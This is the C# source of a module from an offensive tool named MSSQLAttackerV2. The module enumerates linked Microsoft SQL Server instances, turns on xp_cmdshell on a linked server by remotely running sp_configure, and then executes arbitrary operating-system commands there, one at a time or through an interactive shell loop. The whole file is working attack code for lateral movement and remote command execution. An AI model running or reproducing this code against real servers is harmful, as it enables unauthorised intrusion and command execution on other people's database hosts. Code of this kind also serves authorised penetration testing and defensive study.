using System;
using System.Data.SqlClient;
using System.Runtime.InteropServices;

namespace MSSQLAttackerV2.Modules
{
    internal class LinkedServer
    {

        public void enumLinkedServer(SqlConnection con)
        {
            var helpWrite = new Helpwrite();
            var runQuery = new RunQuery();
            String execCmd = "EXEC sp_linkedservers;";
            String servers = helpWrite.getFilteredResult(runQuery.getQueryResult(con, execCmd));
            if (!string.IsNullOrEmpty(servers)) { helpWrite.doWrite(1, "Linked Servers: \n" + servers); return; }
            helpWrite.doWrite(2, "No Linked Servers");
        }

        public void enumLinkedServerVersion(SqlConnection con, [Optional, DefaultParameterValue(null)] String linkedServer)
        {
            var helpWrite = new Helpwrite();
            var runQuery = new RunQuery();
            while (string.IsNullOrEmpty(linkedServer))
            {
                Console.Write("Enter Linked Server: ");
                linkedServer = Console.ReadLine();
            }
            String linkedServerVersion = "select version from openquery(\"" + linkedServer + "\", 'select @@version as version')";
            String versionInfo = helpWrite.getFilteredResult(runQuery.getQueryResult(con, linkedServerVersion));
            if (!string.IsNullOrEmpty(versionInfo)) { helpWrite.doWrite(1, "Linked Server: " + linkedServer + "\n" + versionInfo); return; }
            helpWrite.doWrite(0, "No Information to retrive!");


        }

        public bool checkLinkedCmdshell(SqlConnection con, String linkedServer)
        {
            var helpWrite = new Helpwrite();
            var runQuery = new RunQuery();
            String cmdShellValinUse = "select * from openquery(\"" + linkedServer + "\", 'select value_in_use from sys.configurations where name = ''xp_cmdshell''')";
            String valueInUse = helpWrite.getFilteredResult(runQuery.getQueryResult(con, cmdShellValinUse));
            if (valueInUse == "1") { helpWrite.doWrite(1, "Linked Server: " + linkedServer + "\t Value In Use: " + valueInUse); return true; }
            else { helpWrite.doWrite(0, "Linked Server: " + linkedServer + "\t Value In Use: " + valueInUse); return false; }
        }

        public void enableLinkedCmdShell(SqlConnection con, [Optional, DefaultParameterValue(null)] String linkedServer)

        {
            var helpWrite = new Helpwrite();
            var runQuery = new RunQuery();
            while (string.IsNullOrEmpty(linkedServer))
            {
                Console.Write("Enter Linked Server: ");
                linkedServer = Console.ReadLine();
            }
            if (!checkLinkedCmdshell(con, linkedServer))
            {
                String enableAdvOp = "EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT " + linkedServer;
                String temp = helpWrite.getFilteredResult(runQuery.getQueryResult(con, enableAdvOp));
                String enableXp_cmdshell = "EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT " + linkedServer;
                temp = helpWrite.getFilteredResult(runQuery.getQueryResult(con, enableXp_cmdshell));
                if (checkLinkedCmdshell(con, linkedServer)) { helpWrite.doWrite(1, "xp_cmdshell enabled"); }
                else { helpWrite.doWrite(0, "xp_cmdshell not enabled || check persmissions manually"); }
            }
            else { helpWrite.doWrite(1, "xp_cmdshell already enabled"); }
            return;
        }

        public void linkedServerCmdExec(SqlConnection con, [Optional, DefaultParameterValue(null)] String linkedServer, [Optional, DefaultParameterValue(null)] String command)
        {
            var helpWrite = new Helpwrite();
            var runQuery = new RunQuery();
            while (string.IsNullOrEmpty(linkedServer))
            {
                Console.Write("Enter Linked Server: ");
                linkedServer = Console.ReadLine();
            }
            if (!checkLinkedCmdshell(con, linkedServer))
            {
                helpWrite.doWrite(0, "xp_cmdshell not enabled");
                return;
            }
            if (string.IsNullOrEmpty(command))
            {
                while (true)
                {
                    Console.Write("Enter Command: ");
                    String input = Console.ReadLine();
                    if (input == "exit") { break; }
                    if (string.IsNullOrEmpty(input)) { continue; }
                    //String cmd = "cmd.exe /c " + input; #BugFix
                    String cmdString = "select * from openquery(\"" + linkedServer + "\", 'select 1; exec xp_cmdshell ''" + input + "''')";
                    String temp = helpWrite.getFilteredResult(runQuery.getQueryResult(con, cmdString));
                    //Additional Check
                    if (temp == "1") { helpWrite.doWrite(2, "Command Executed");}
                    else { helpWrite.doWrite(0, "Command Execution Failed"); }
                    continue;
                }
                helpWrite.doWrite(0, "Exiting!");
                return;
            }
            try
            {
                //String basecmd = "cmd.exe /c " + command; #BugFix
                String query = "select * from openquery(\"" + linkedServer + "\", 'select 1; exec xp_cmdshell ''" + command + "''')";
                String temp1 = helpWrite.getFilteredResult(runQuery.getQueryResult(con, query));
                if (temp1 == "1") { helpWrite.doWrite(2, "Command Executed"); }
                else { helpWrite.doWrite(0, "Command Execution Failed"); }
            }
            catch (Exception)
            {
                helpWrite.doWrite(0, "Command Execution Failed!", 0);

            }
        }
    }
}
